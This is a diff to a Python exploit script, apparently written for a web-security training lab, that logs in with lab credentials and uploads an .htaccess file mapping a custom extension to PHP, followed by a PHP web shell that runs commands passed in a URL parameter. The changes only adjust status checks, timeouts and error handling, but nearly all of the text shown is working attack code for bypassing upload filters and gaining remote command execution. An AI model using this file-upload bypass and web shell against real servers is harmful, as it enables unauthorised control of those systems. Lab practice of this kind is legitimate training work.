@@ -11,16 +11,17 @@ def extract_csrf_token(response):
 
 def login(url, session):
     response = session.get(f"{url}/login", timeout=10)
-    csrf_token = extract_csrf_token(response)
+    if response.status_code == 200:
+        csrf_token = extract_csrf_token(response)
 
-    login_data = {
-        "csrf": csrf_token,
-        "username": "wiener",
-        "password": "peter"
-    }
+        login_data = {
+            "csrf": csrf_token,
+            "username": "wiener",
+            "password": "peter"
+        }
 
-    login_response = session.post(f"{url}/login", data=login_data, timeout=10)
-    return login_response.status_code == 200
+        login_response = session.post(f"{url}/login", data=login_data, timeout=10)
+        return login_response.status_code == 200
 
 
 def upload_file(url, session):
@@ -28,11 +29,11 @@ def upload_file(url, session):
     csrf_token = extract_csrf_token(response)
 
     htaccess_file = {
-        "avatar": (".htaccess", "AddType application/x-httpd-php .l33t", "text/plain"),
+        "avatar": (".htaccess", "AddType application/x-httpd-php .l33t", "text/plain")
     }
 
     web_shell_file = {
-        "avatar": ("webshell.l33t", "<?php system($_GET['cmd']); ?>", "application/x-php"),
+        "avatar": ("webshell.l33t", "<?php system($_GET['cmd']); ?>", "application/x-php")
     }
 
     data = {
@@ -40,8 +41,8 @@ def upload_file(url, session):
         "csrf": csrf_token
     }
 
-    htaccess_file_upload = session.post(f"{url}/my-account/avatar", files=htaccess_file, data=data)
-    web_shell_upload = session.post(f"{url}/my-account/avatar", files=web_shell_file, data=data)
+    htaccess_file_upload = session.post(f"{url}/my-account/avatar", files=htaccess_file, data=data, timeout=10)
+    web_shell_upload = session.post(f"{url}/my-account/avatar", files=web_shell_file, data=data, timeout=10)
     return htaccess_file_upload.status_code == 200 and web_shell_upload.status_code == 200
 
 
@@ -76,15 +77,12 @@ def main():
 
     except requests.exceptions.Timeout:
         print("(-) Request timed out.")
-        sys.exit(1)
 
     except requests.exceptions.MissingSchema:
         print("(-) Please enter a valid URL.")
-        sys.exit(1)
 
     except requests.exceptions.ConnectionError:
         print("(-) Unable to connect to host. Please check your URL and try again.")
-        sys.exit(1)
 
 
 if __name__ == "__main__":
